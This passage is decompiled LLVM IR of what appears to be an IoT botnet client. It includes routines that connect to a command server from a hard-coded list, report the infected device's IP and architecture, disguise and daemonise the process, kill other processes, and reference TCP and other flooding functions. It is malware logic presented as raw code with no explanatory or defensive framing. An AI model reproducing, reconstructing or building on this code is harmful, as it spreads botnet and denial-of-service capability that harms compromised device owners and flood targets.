dec_label_pc_1000afb4:                            ; preds = %dec_label_pc_1000aedc, %dec_label_pc_1000ae04, %dec_label_pc_1000adb0, %dec_label_pc_1000af14
  %v2_1000afb8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_10018d58.662 to i32), i32* @r4, align 4
  %v3_1000afc8 = inttoptr i32 %v2_1000afb8 to i8*
  %v4_1000afc8 = call i32 @__GI_strcoll(i8* %v3_1000afc8, i32 ptrtoint ([9 x i8]* @global_var_10018d58.662 to i32))
  %v3_1000afd0 = icmp eq i32 %v4_1000afc8, 0
  br i1 %v3_1000afd0, label %dec_label_pc_1000afd8, label %dec_label_pc_1000b0e4

dec_label_pc_1000afd8:                            ; preds = %dec_label_pc_1000afb4
  br label %dec_label_pc_1000b07c

dec_label_pc_1000afec:                            ; preds = %dec_label_pc_1000b07c, %dec_label_pc_1000b0c4
  %v1_1000aff0 = mul i32 %storemerge6, 4
  %v3_1000affc = load i32, i32* @global_var_1002b92c.54, align 4
  %v2_1000b000 = add i32 %v3_1000affc, %v1_1000aff0
  %v1_1000b004 = inttoptr i32 %v2_1000b000 to i32*
  %v2_1000b004 = load i32, i32* %v1_1000b004, align 4
  %v3_1000b008 = icmp eq i32 %v2_1000b004, 0
  br i1 %v3_1000b008, label %dec_label_pc_1000b070, label %dec_label_pc_1000b010

dec_label_pc_1000b010:                            ; preds = %dec_label_pc_1000afec
  %v2_1000b028 = load i32, i32* %v1_1000b004, align 4
  store i32 268480560, i32* @lr, align 4
  %v0_1000b02c = call i32 @__libc_getpid()
  %v4_1000b034 = icmp eq i32 %v2_1000b028, %v0_1000b02c
  br i1 %v4_1000b034, label %dec_label_pc_1000b070, label %dec_label_pc_1000b03c

dec_label_pc_1000b03c:                            ; preds = %dec_label_pc_1000b010
  %v3_1000b04c = load i32, i32* @global_var_1002b92c.54, align 4
  %v2_1000b050 = add i32 %v3_1000b04c, %v1_1000aff0
  %v1_1000b054 = inttoptr i32 %v2_1000b050 to i32*
  %v2_1000b054 = load i32, i32* %v1_1000b054, align 4
  store i32 268480612, i32* @lr, align 4
  %v2_1000b060 = call i32 @kill(i32 %v2_1000b054, i32 9)
  %v1_1000b068 = add i32 %stack_var_-148.1, 1
  br label %dec_label_pc_1000b070

dec_label_pc_1000b070:                            ; preds = %dec_label_pc_1000b010, %dec_label_pc_1000afec, %dec_label_pc_1000b03c
  %stack_var_-148.0 = phi i32 [ %stack_var_-148.1, %dec_label_pc_1000afec ], [ %stack_var_-148.1, %dec_label_pc_1000b010 ], [ %v1_1000b068, %dec_label_pc_1000b03c ]
  %v1_1000b074 = add i32 %storemerge6, 1
  br label %dec_label_pc_1000b07c

dec_label_pc_1000b07c:                            ; preds = %dec_label_pc_1000afd8, %dec_label_pc_1000b070
  %stack_var_-148.1 = phi i32 [ 0, %dec_label_pc_1000afd8 ], [ %stack_var_-148.0, %dec_label_pc_1000b070 ]
  %storemerge6 = phi i32 [ 0, %dec_label_pc_1000afd8 ], [ %v1_1000b074, %dec_label_pc_1000b070 ]
  %v2_1000b0a4 = load i32, i32* @global_var_1002b900.52, align 4
  %v3_1000b0bc = icmp eq i32 %v2_1000b0a4, 0
  br i1 %v3_1000b0bc, label %dec_label_pc_1000b0c4, label %dec_label_pc_1000afec

dec_label_pc_1000b0c4:                            ; preds = %dec_label_pc_1000b07c
  %v3_1000b0a8 = load i32, i32* @global_var_1002b904.53, align 4
  %v3_1000b0dc = icmp ugt i32 %v3_1000b0a8, %storemerge6
  br i1 %v3_1000b0dc, label %dec_label_pc_1000afec, label %dec_label_pc_1000b0e4

dec_label_pc_1000b0e4:                            ; preds = %dec_label_pc_1000b0c4, %dec_label_pc_1000afb4
  %v2_1000b0e8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_10018d64.663 to i32), i32* @r4, align 4
  %v3_1000b0f8 = inttoptr i32 %v2_1000b0e8 to i8*
  %v4_1000b0f8 = call i32 @__GI_strcoll(i8* %v3_1000b0f8, i32 ptrtoint ([15 x i8]* @global_var_10018d64.663 to i32))
  %v3_1000b100 = icmp eq i32 %v4_1000b0f8, 0
  br i1 %v3_1000b100, label %dec_label_pc_1000b108, label %dec_label_pc_1000b110

dec_label_pc_1000b108:                            ; preds = %dec_label_pc_1000b0e4
  %v0_1000b10c = call i32 @__GI_exit()
  br label %dec_label_pc_1000b110

dec_label_pc_1000b110:                            ; preds = %dec_label_pc_1000ac90, %dec_label_pc_1000aa78, %dec_label_pc_1000ac08, %dec_label_pc_1000ad88, %dec_label_pc_1000af04, %dec_label_pc_1000b0e4, %dec_label_pc_1000a8dc, %dec_label_pc_1000add4, %dec_label_pc_1000ac70, %dec_label_pc_1000ac64, %dec_label_pc_1000aa4c, %dec_label_pc_1000aa1c, %dec_label_pc_1000a9f8, %dec_label_pc_1000a9ec, %dec_label_pc_1000a868, %dec_label_pc_1000a904, %dec_label_pc_1000a820, %dec_label_pc_1000a7d0, %dec_label_pc_1000b108
  %v0_1000b138 = phi i32 [ %v2_1000aca0, %dec_label_pc_1000ac90 ], [ %v2_1000aa88, %dec_label_pc_1000aa78 ], [ %v0_1000ac08, %dec_label_pc_1000ac08 ], [ %v0_1000ad88, %dec_label_pc_1000ad88 ], [ %v0_1000af04, %dec_label_pc_1000af04 ], [ %v4_1000b0f8, %dec_label_pc_1000b0e4 ], [ 0, %dec_label_pc_1000a8dc ], [ 0, %dec_label_pc_1000add4 ], [ %v2_1000ac80, %dec_label_pc_1000ac70 ], [ 0, %dec_label_pc_1000ac64 ], [ %v2_1000aa5c, %dec_label_pc_1000aa4c ], [ -1, %dec_label_pc_1000aa1c ], [ -1, %dec_label_pc_1000a9f8 ], [ 0, %dec_label_pc_1000a9ec ], [ 0, %dec_label_pc_1000a868 ], [ %v0_1000a8ec, %dec_label_pc_1000a904 ], [ %v4_1000a838, %dec_label_pc_1000a820 ], [ %v4_1000a7e8, %dec_label_pc_1000a7d0 ], [ %v0_1000b10c, %dec_label_pc_1000b108 ]
  ret i32 %v0_1000b138

; uselistorder directives
  uselistorder i32 %storemerge6, { 1, 0, 2 }
  uselistorder i32 %stack_var_-148.1, { 0, 2, 1 }
  uselistorder i32 %v1_1000aff0, { 1, 0 }
  uselistorder i32* %v1_1000ade8, { 2, 0, 1, 3 }
  uselistorder i32 %v3_1000ad6c, { 1, 0 }
  uselistorder i32 %v2_1000acf0, { 1, 0 }
  uselistorder i32 %v2_1000acd4, { 1, 0 }
  uselistorder i32 %v2_1000acbc, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1000abec, { 1, 0 }
  uselistorder i32 %storemerge5, { 1, 0 }
  uselistorder i32 %v2_1000aaec, { 1, 0 }
  uselistorder i32 %v2_1000aad8, { 1, 0 }
  uselistorder i32 %v2_1000aabc, { 1, 0 }
  uselistorder i32 %v2_1000aaa4, { 1, 0, 3, 2 }
  uselistorder i32 %tmp, { 4, 5, 6, 1, 2, 3, 7, 8, 9, 10, 11, 12, 13, 14, 0, 15, 16, 17 }
  uselistorder i32 (i32, i32, i32)* @SendSTD, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @SendTCP, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10018cd4.626 to i32), { 2, 8, 3, 9, 1, 10, 4, 11, 0, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_10017b30.45 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000b110, { 18, 5, 4, 7, 3, 0, 8, 9, 2, 1, 10, 11, 12, 13, 15, 6, 14, 16, 17 }
  uselistorder label %dec_label_pc_1000b07c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b070, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000afec, { 1, 0 }
  uselistorder label %dec_label_pc_1000afb4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000aedc, { 1, 0 }
  uselistorder label %dec_label_pc_1000ae2c, { 1, 0 }
  uselistorder label %dec_label_pc_1000adb0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000ad60, { 1, 0 }
  uselistorder label %dec_label_pc_1000ad38, { 1, 0 }
  uselistorder label %dec_label_pc_1000ac40, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000abe0, { 1, 0 }
  uselistorder label %dec_label_pc_1000aba8, { 1, 0 }
  uselistorder label %dec_label_pc_1000ab5c, { 1, 0 }
  uselistorder label %dec_label_pc_1000aa9c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a9c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a94c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a8b4, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4120 = alloca i32, align 4
  %v2_1000b150 = ptrtoint i32* %stack_var_-4120 to i32
  store i32 268480872, i32* @lr, align 4
  %v3_1000b164 = call i32 @__GI_memset(i32 %v2_1000b150, i32 0, i32 4096)
  %v3_1000b16c = load i32, i32* @global_var_1002b8f8.44, align 4
  %v3_1000b170 = icmp eq i32 %v3_1000b16c, 0
  br i1 %v3_1000b170, label %dec_label_pc_1000b194, label %dec_label_pc_1000b178

dec_label_pc_1000b178:                            ; preds = %entry
  store i32 268480904, i32* @lr, align 4
  %v1_1000b184 = call i32 @__libc_close(i32 %v3_1000b16c)
  store i32 0, i32* @global_var_1002b8f8.44, align 4
  br label %dec_label_pc_1000b194

dec_label_pc_1000b194:                            ; preds = %entry, %dec_label_pc_1000b178
  %v3_1000b198 = load i32, i32* @global_var_1002b8b8.664, align 4
  %v3_1000b19c = icmp eq i32 %v3_1000b198, 0
  br i1 %v3_1000b19c, label %dec_label_pc_1000b1a4, label %dec_label_pc_1000b1b4

dec_label_pc_1000b1a4:                            ; preds = %dec_label_pc_1000b194
  br label %dec_label_pc_1000b1c8

dec_label_pc_1000b1b4:                            ; preds = %dec_label_pc_1000b194
  %v1_1000b1bc = add i32 %v3_1000b198, 1
  br label %dec_label_pc_1000b1c8

dec_label_pc_1000b1c8:                            ; preds = %dec_label_pc_1000b1a4, %dec_label_pc_1000b1b4
  %storemerge = phi i32 [ 0, %dec_label_pc_1000b1a4 ], [ %v1_1000b1bc, %dec_label_pc_1000b1b4 ]
  store i32 %storemerge, i32* @global_var_1002b8b8.664, align 4
  %v1_1000b1dc = mul i32 %storemerge, 4
  %v2_1000b1e0 = add i32 %v1_1000b1dc, ptrtoint ([15 x i8]** @global_var_1002b8a0.666 to i32)
  %v1_1000b1e4 = inttoptr i32 %v2_1000b1e0 to i32*
  %v2_1000b1e4 = load i32, i32* %v1_1000b1e4, align 4
  %v2_1000b1f0 = inttoptr i32 %v2_1000b1e4 to i8*
  %v3_1000b1f0 = call i32 @strcpy(i32 %v2_1000b150, i8* %v2_1000b1f0)
  store i32 %v2_1000b150, i32* @r3, align 4
  store i32 268481028, i32* @lr, align 4
  %v2_1000b200 = call i32 @__GI_strchr(i32 %v2_1000b150, i32 58)
  %v3_1000b208 = icmp eq i32 %v2_1000b200, 0
  br i1 %v3_1000b208, label %dec_label_pc_1000b25c, label %dec_label_pc_1000b210

dec_label_pc_1000b210:                            ; preds = %dec_label_pc_1000b1c8
  store i32 %v2_1000b150, i32* @r3, align 4
  store i32 268481056, i32* @lr, align 4
  %v2_1000b21c = call i32 @__GI_strchr(i32 %v2_1000b150, i32 58)
  %v1_1000b224 = add i32 %v2_1000b21c, 1
  store i32 268481072, i32* @lr, align 4
  %v2_1000b22c = call i32 @atol(i32 %v1_1000b224, i32 %v2_1000b21c)
  store i32 %v2_1000b22c, i32* @global_var_1002b8a4.667, align 4
  store i32 %v2_1000b150, i32* @r3, align 4
  store i32 268481100, i32* @lr, align 4
  %v2_1000b248 = call i32 @__GI_strchr(i32 %v2_1000b150, i32 58)
  %v3_1000b258 = inttoptr i32 %v2_1000b248 to i8*
  store i8 0, i8* %v3_1000b258, align 1
  br label %dec_label_pc_1000b25c

dec_label_pc_1000b25c:                            ; preds = %dec_label_pc_1000b1c8, %dec_label_pc_1000b210
  store i32 268481132, i32* @lr, align 4
  %v3_1000b268 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_1000b268, i32* @global_var_1002b8f8.44, align 4
  %v3_1000b288 = load i32, i32* @global_var_1002b8a4.667, align 4
  store i32 268481184, i32* @lr, align 4
  %v5_1000b29c = call i32 @connectTimeout(i32 %v3_1000b268, i32 %v2_1000b150, i32 %v3_1000b288, i32 30, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v3_1000b2a4 = icmp eq i32 %v5_1000b29c, 0
  %. = zext i1 %v3_1000b2a4 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_1000b150, { 0, 2, 1, 4, 3, 6, 5, 7, 8 }
  uselistorder i32 (i32, i32)* @atol, { 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b25c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b1c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000b194, { 1, 0 }
}

define i32 @getOurIP(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-46 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-4160 = alloca i8, align 1
  %stack_var_-4164 = alloca i32, align 4
  %stack_var_-4180 = alloca i32, align 4
  %stack_var_-4196 = alloca i32, align 4
  store i32 268481284, i32* @lr, align 4
  %v3_1000b300 = call i32 @socket(i32 2, i32 2, i32 0)
  %v4_1000b314 = icmp eq i32 %v3_1000b300, -1
  br i1 %v4_1000b314, label %dec_label_pc_1000b31c, label %dec_label_pc_1000b328

dec_label_pc_1000b31c:                            ; preds = %entry
  br label %dec_label_pc_1000b554

dec_label_pc_1000b328:                            ; preds = %entry
  %v2_1000b328 = ptrtoint i32* %stack_var_-4196 to i32
  store i32 2, i32* %stack_var_-4196, align 4
  store i32 268481376, i32* @lr, align 4
  %v2_1000b35c = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_10018d74.668 to i32))
  store i32 53, i32* @r3, align 4
  %v1_1000b36c = call i32 @htons(i32 53)
  store i32 268481420, i32* @lr, align 4
  %v3_1000b388 = call i32 @__libc_connect(i32 %v3_1000b300, i32 %v2_1000b328, i32 16)
  %v4_1000b39c = icmp eq i32 %v3_1000b388, -1
  br i1 %v4_1000b39c, label %dec_label_pc_1000b3a4, label %dec_label_pc_1000b3b0

dec_label_pc_1000b3a4:                            ; preds = %dec_label_pc_1000b328
  br label %dec_label_pc_1000b554

dec_label_pc_1000b3b0:                            ; preds = %dec_label_pc_1000b328
  store i32 16, i32* %stack_var_-4164, align 4
  %v2_1000b3b8 = ptrtoint i32* %stack_var_-4180 to i32
  %v2_1000b3bc = ptrtoint i32* %stack_var_-4164 to i32
  store i32 268481488, i32* @lr, align 4
  %v4_1000b3cc = call i32 @__GI_getsockname(i32 %v3_1000b300, i32 %v2_1000b3b8, i32 %v2_1000b3bc, i32 %v2_1000b3bc)
  %v4_1000b3e0 = icmp eq i32 %v4_1000b3cc, -1
  br i1 %v4_1000b3e0, label %dec_label_pc_1000b3e8, label %dec_label_pc_1000b3f4

dec_label_pc_1000b3e8:                            ; preds = %dec_label_pc_1000b3b0
  br label %dec_label_pc_1000b554

dec_label_pc_1000b3f4:                            ; preds = %dec_label_pc_1000b3b0
  store i32 268481556, i32* @lr, align 4
  %v3_1000b410 = call i32 @__libc_open(i32 ptrtoint ([16 x i8]* @global_var_10018d7c.669 to i32), i32 0)
  %v2_1000b494 = ptrtoint i8* %stack_var_-4160 to i32
  br label %dec_label_pc_1000b494

dec_label_pc_1000b420:                            ; preds = %dec_label_pc_1000b494
  store i32 268481588, i32* @lr, align 4
  %v5_1000b430 = call i32 @strstr(i32 %v2_1000b494, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10018d8c.670, i32 0, i32 0), i32 268566528)
  %v3_1000b438 = icmp eq i32 %v5_1000b430, 0
  br i1 %v3_1000b438, label %dec_label_pc_1000b47c, label %dec_label_pc_1000b458.preheader

dec_label_pc_1000b458.preheader:                  ; preds = %dec_label_pc_1000b420
  %v2_1000b45c10 = load i8, i8* %stack_var_-4160, align 1
  %v3_1000b46414 = icmp eq i8 %v2_1000b45c10, 9
  br i1 %v3_1000b46414, label %dec_label_pc_1000b46c, label %dec_label_pc_1000b44c

dec_label_pc_1000b44c:                            ; preds = %dec_label_pc_1000b458.preheader, %dec_label_pc_1000b44c
  %v4_1000b45815 = phi i32 [ %v1_1000b450, %dec_label_pc_1000b44c ], [ %v2_1000b494, %dec_label_pc_1000b458.preheader ]
  %v1_1000b450 = add i32 %v4_1000b45815, 1
  %v5_1000b454 = inttoptr i32 %v1_1000b450 to i8*
  %v2_1000b45c = load i8, i8* %v5_1000b454, align 1
  %v3_1000b464 = icmp eq i8 %v2_1000b45c, 9
  br i1 %v3_1000b464, label %dec_label_pc_1000b46c, label %dec_label_pc_1000b44c

dec_label_pc_1000b46c:                            ; preds = %dec_label_pc_1000b44c, %dec_label_pc_1000b458.preheader
  %storemerge4.lcssa = phi i8* [ %stack_var_-4160, %dec_label_pc_1000b458.preheader ], [ %v5_1000b454, %dec_label_pc_1000b44c ]
  store i8 0, i8* %storemerge4.lcssa, align 1
  br label %dec_label_pc_1000b4b4

dec_label_pc_1000b47c:                            ; preds = %dec_label_pc_1000b420
  store i32 268481684, i32* @lr, align 4
  %v3_1000b490 = call i32 @__GI_memset(i32 %v2_1000b494, i32 0, i32 4096)
  br label %dec_label_pc_1000b494

dec_label_pc_1000b494:                            ; preds = %dec_label_pc_1000b3f4, %dec_label_pc_1000b47c
  %v3_1000b4a4 = call i32 @fdgets(i32 %v2_1000b494, i32 4096, i32 %v3_1000b410)
  %v3_1000b4ac = icmp eq i32 %v3_1000b4a4, 0
  br i1 %v3_1000b4ac, label %dec_label_pc_1000b4b4, label %dec_label_pc_1000b420

dec_label_pc_1000b4b4:                            ; preds = %dec_label_pc_1000b494, %dec_label_pc_1000b46c
  store i32 268481724, i32* @lr, align 4
  %v1_1000b4b8 = call i32 @__libc_close(i32 %v3_1000b410)
  %v3_1000b4bc = load i8, i8* %stack_var_-4160, align 1
  %v3_1000b4c4 = icmp eq i8 %v3_1000b4bc, 0
  br i1 %v3_1000b4c4, label %dec_label_pc_1000b548, label %dec_label_pc_1000b4cc

dec_label_pc_1000b4cc:                            ; preds = %dec_label_pc_1000b4b4
  %v2_1000b4cc = ptrtoint i32* %stack_var_-64 to i32
  %v3_1000b4dc = call i32 @strcpy(i32 %v2_1000b4cc, i8* nonnull %stack_var_-4160)
  store i32 ptrtoint (i32* @global_var_1000b4fc.671 to i32), i32* @lr, align 4
  %v3_1000b4f8 = call i32 @ioctl(i32 %v3_1000b300, i32 35111, i32 %v2_1000b4cc)
  %v2_1000b510 = ptrtoint i32* %stack_var_-46 to i32
  br label %dec_label_pc_1000b508

dec_label_pc_1000b508:                            ; preds = %dec_label_pc_1000b4cc, %dec_label_pc_1000b508
  %storemerge58 = phi i32 [ 0, %dec_label_pc_1000b4cc ], [ %v1_1000b534, %dec_label_pc_1000b508 ]
  %v2_1000b518 = add i32 %storemerge58, %v2_1000b510
  %v1_1000b51c = inttoptr i32 %v2_1000b518 to i8*
  %v2_1000b51c = load i8, i8* %v1_1000b51c, align 1
  %v4_1000b52c = add i32 %storemerge58, ptrtoint (i32* @global_var_1002b908.672 to i32)
  %v5_1000b52c = inttoptr i32 %v4_1000b52c to i8*
  store i8 %v2_1000b51c, i8* %v5_1000b52c, align 1
  %v1_1000b534 = add nuw nsw i32 %storemerge58, 1
  %tmp37 = icmp slt i32 %v1_1000b534, 6
  br i1 %tmp37, label %dec_label_pc_1000b508, label %dec_label_pc_1000b548

dec_label_pc_1000b548:                            ; preds = %dec_label_pc_1000b508, %dec_label_pc_1000b4b4
  store i32 ptrtoint (i32* @global_var_1000b550.673 to i32), i32* @lr, align 4
  %v1_1000b54c = call i32 @__libc_close(i32 %v3_1000b300)
  br label %dec_label_pc_1000b55c

dec_label_pc_1000b554:                            ; preds = %dec_label_pc_1000b3e8, %dec_label_pc_1000b3a4, %dec_label_pc_1000b31c
  br label %dec_label_pc_1000b55c

dec_label_pc_1000b55c:                            ; preds = %dec_label_pc_1000b548, %dec_label_pc_1000b554
  %stack_var_-20.0 = phi i32 [ 0, %dec_label_pc_1000b554 ], [ %tmp, %dec_label_pc_1000b548 ]
  ret i32 %stack_var_-20.0

; uselistorder directives
  uselistorder i32 %storemerge58, { 2, 1, 0 }
  uselistorder i32 %v1_1000b450, { 1, 0 }
  uselistorder i32 %v2_1000b494, { 3, 1, 0, 2 }
  uselistorder i32 %v3_1000b300, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4164, { 1, 0 }
  uselistorder i8* %stack_var_-4160, { 2, 4, 0, 1, 3 }
  uselistorder i8 9, { 1, 0, 2 }
  uselistorder i32 (i32)* @htons, { 6, 5, 4, 7, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b55c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b508, { 1, 0 }
  uselistorder label %dec_label_pc_1000b494, { 1, 0 }
  uselistorder label %dec_label_pc_1000b44c, { 1, 0 }
}

define i32 @archType() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([8 x i8]* @global_var_10018d98.674 to i32)
}

define i32 @getBuild() local_unnamed_addr {
entry:
  store i32 268481988, i32* @lr, align 4
  %v4_1000b5c0 = call i32 @access(i32 ptrtoint ([16 x i8]* @global_var_10018da0.675 to i32), i32 0, i32 268566528)
  %v4_1000b5cc = icmp eq i32 %v4_1000b5c0, -1
  %. = select i1 %v4_1000b5cc, i32 ptrtoint ([7 x i8]* @global_var_10018db8.677 to i32), i32 ptrtoint ([7 x i8]* @global_var_10018db0.676 to i32)
  ret i32 %.
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-5252 = alloca i32, align 4
  %stack_var_-5212 = alloca i32, align 4
  %stack_var_-4188 = alloca i32, align 4
  %stack_var_-5320 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-5256 = alloca i32, align 4
  store i32 268482132, i32* @lr, align 4
  %v4_1000b650 = call i32 @access(i32 ptrtoint ([16 x i8]* @global_var_10018da0.675 to i32), i32 0, i32 268566528)
  %v4_1000b65c = icmp eq i32 %v4_1000b650, -1
  %.21 = select i1 %v4_1000b65c, i32 ptrtoint ([19 x i8]* @global_var_10018dc4.679 to i32), i32 ptrtoint ([5 x i8]* @global_var_100170f4.466 to i32)
  store i32 268482180, i32* @lr, align 4
  %v0_1000b680 = call i32 @geteuid()
  %v3_1000b688 = icmp eq i32 %v0_1000b680, 0
  br i1 %v3_1000b688, label %dec_label_pc_1000b690, label %dec_label_pc_1000b69c

dec_label_pc_1000b690:                            ; preds = %entry
  store i32 0, i32* @global_var_1002b8b4.680, align 4
  br label %dec_label_pc_1000b69c

dec_label_pc_1000b69c:                            ; preds = %entry, %dec_label_pc_1000b690
  store i32 268482208, i32* @lr, align 4
  %v0_1000b69c = call i32 @getBuild()
  %v1_1000b6ac = bitcast i8** %argv to i32*
  %v2_1000b6ac = load i32, i32* %v1_1000b6ac, align 4
  store i32 %v2_1000b6ac, i32* @r3, align 4
  %v0_1000b6c0 = call i32 @__GI_strlen()
  store i32 ptrtoint (i32* @global_var_10018dc0.678 to i32), i32* @r4, align 4
  store i32 268482268, i32* @lr, align 4
  %v3_1000b6d8 = call i32 @strncpy(i32 %v2_1000b6ac, i32 ptrtoint (i32* @global_var_10018dc0.678 to i32), i32 %v0_1000b6c0)
  %v3_1000b6e0 = load i32, i32* %v1_1000b6ac, align 4
  store i32 %v3_1000b6e0, i32* @r3, align 4
  store i32 268482292, i32* @lr, align 4
  %v5_1000b6f0 = load i32, i32* @r6, align 4
  %v6_1000b6f0 = load i32, i32* @r7, align 4
  %v7_1000b6f0 = load i32, i32* @r8, align 4
  %v11_1000b6f0 = call i32 @sprintf(i32 %v3_1000b6e0, i32 %.21, i32 %tmp, i32 %v5_1000b6f0, i32 %v6_1000b6f0, i32 %v7_1000b6f0, i32 %tmp, i32 ptrtoint (i32* @0 to i32))
  store i32 ptrtoint ([3 x i8]* @global_var_1000b714.681 to i32), i32* @lr, align 4
  %v6_1000b710 = call i32 @prctl(i32 15, i32 %.21, i32 0, i32 0, i32 0)
  store i32 268482332, i32* @lr, align 4
  %v1_1000b718 = call i32 @__GI_time(i32 0)
  store i32 268482340, i32* @lr, align 4
  %v0_1000b720 = call i32 @__libc_getpid()
  %v2_1000b728 = xor i32 %v1_1000b718, %v0_1000b720
  store i32 ptrtoint ([3 x i8]* @global_var_1000b734.682 to i32), i32* @lr, align 4
  %v1_1000b730 = call i32 @srand(i32 %v2_1000b728)
  store i32 268482364, i32* @lr, align 4
  %v1_1000b738 = call i32 @__GI_time(i32 0)
  store i32 268482372, i32* @lr, align 4
  %v0_1000b740 = call i32 @__libc_getpid()
  %v2_1000b748 = xor i32 %v1_1000b738, %v0_1000b740
  %v1_1000b750 = call i32 @init_rand(i32 %v2_1000b748)
  store i32 ptrtoint (i32* @global_var_1000b758.683 to i32), i32* @lr, align 4
  %v1_1000b754 = call i32 @getOurIP(i32 %v1_1000b750)
  store i32 268482396, i32* @lr, align 4
  %v0_1000b758 = call i32 @__libc_fork()
  %v3_1000b768 = icmp eq i32 %v0_1000b758, 0
  br i1 %v3_1000b768, label %dec_label_pc_1000b798, label %dec_label_pc_1000b78c

dec_label_pc_1000b78c:                            ; preds = %dec_label_pc_1000b69c
  %v2_1000b770 = ptrtoint i32* %stack_var_-5256 to i32
  store i32 ptrtoint ([3 x i8]* @global_var_1000b784.684 to i32), i32* @lr, align 4
  %v3_1000b780 = call i32 @__libc_waitpid(i32 %v0_1000b758, i32 %v2_1000b770, i32 0)
  %v0_1000b788 = call i32 @__GI_exit()
  br label %dec_label_pc_1000b7b8

dec_label_pc_1000b798:                            ; preds = %dec_label_pc_1000b69c
  store i32 268482460, i32* @lr, align 4
  %v0_1000b798 = call i32 @__libc_fork()
  %v3_1000b7a8 = icmp eq i32 %v0_1000b798, 0
  br i1 %v3_1000b7a8, label %dec_label_pc_1000b7b8, label %dec_label_pc_1000b7b0

dec_label_pc_1000b7b0:                            ; preds = %dec_label_pc_1000b798
  %v0_1000b7b4 = call i32 @__GI_exit()
  br label %dec_label_pc_1000b7b8

dec_label_pc_1000b7b8:                            ; preds = %dec_label_pc_1000b78c, %dec_label_pc_1000b798, %dec_label_pc_1000b7b0
  store i32 268482492, i32* @lr, align 4
  %v0_1000b7b8 = call i32 @__GI_setsid()
  store i32 ptrtoint ([3 x i8]* @global_var_1000b7c8.687 to i32), i32* @lr, align 4
  %v2_1000b7c4 = call i32 @chdir(i32 ptrtoint (i32* @global_var_10018dd8.686 to i32), i32 268566528)
  store i32 ptrtoint (i32* @global_var_1000b7d4.688 to i32), i32* @lr, align 4
  %v2_1000b7d0 = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_1000c018 = ptrtoint i32* %stack_var_-4188 to i32
  %v4_1000c028 = bitcast i32* %stack_var_-4188 to i8*
  %v2_1000bb30 = ptrtoint i32* %stack_var_-5320 to i32
  %v1_1000bc40 = or i32 %v2_1000c018, 1
  %v2_1000bdd4 = ptrtoint i32* %stack_var_-5212 to i32
  %v2_1000bfe0 = add i32 %v2_1000bb30, 68
  br label %dec_label_pc_1000b7d8

dec_label_pc_1000b7d8:                            ; preds = %dec_label_pc_1000b7e8, %dec_label_pc_1000c010, %dec_label_pc_1000b7b8
  %v0_1000b7d8 = call i32 @initConnection()
  %v3_1000b7e0 = icmp eq i32 %v0_1000b7d8, 0
  br i1 %v3_1000b7e0, label %dec_label_pc_1000b7f4, label %dec_label_pc_1000b7e8

dec_label_pc_1000b7e8:                            ; preds = %dec_label_pc_1000b7d8
  store i32 268482544, i32* @lr, align 4
  %v1_1000b7ec = call i32 @sleep(i32 5)
  br label %dec_label_pc_1000b7d8

dec_label_pc_1000b7f4:                            ; preds = %dec_label_pc_1000b7d8
  %v3_1000b7f8 = load i32, i32* @global_var_1002b8f8.44, align 4
  store i32 %v3_1000b7f8, i32* %r28.global-to-local, align 4
  store i32 268482560, i32* @lr, align 4
  %v0_1000b7fc = call i32 @getBuild()
  store i32 %v0_1000b7fc, i32* %r27.global-to-local, align 4
  %v3_1000b808 = load i32, i32* @global_var_1002b920.309, align 4
  store i32 %v3_1000b808, i32* %stack_var_-80, align 4
  store i32 268482588, i32* @lr, align 4
  %v3_1000b818 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-80, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v0_1000b820 = call i32 @archType()
  %v0_1000b828 = load i32, i32* %r28.global-to-local, align 4
  %v0_1000b834 = load i32, i32* %r27.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000b848.690 to i32), i32* @lr, align 4
  %v7_1000b844 = call i32 @sockprintf(i32 %v0_1000b828, i32 ptrtoint ([43 x i8]* @global_var_10018ddc.689 to i32), i32 %v0_1000b834)
  br label %dec_label_pc_1000c010

dec_label_pc_1000b868:                            ; preds = %dec_label_pc_1000bb1c, %dec_label_pc_1000bac0
  %v1_1000b86c = mul i32 %storemerge14, 4
  %v3_1000b878 = load i32, i32* @global_var_1002b92c.54, align 4
  %v2_1000b87c = add i32 %v3_1000b878, %v1_1000b86c
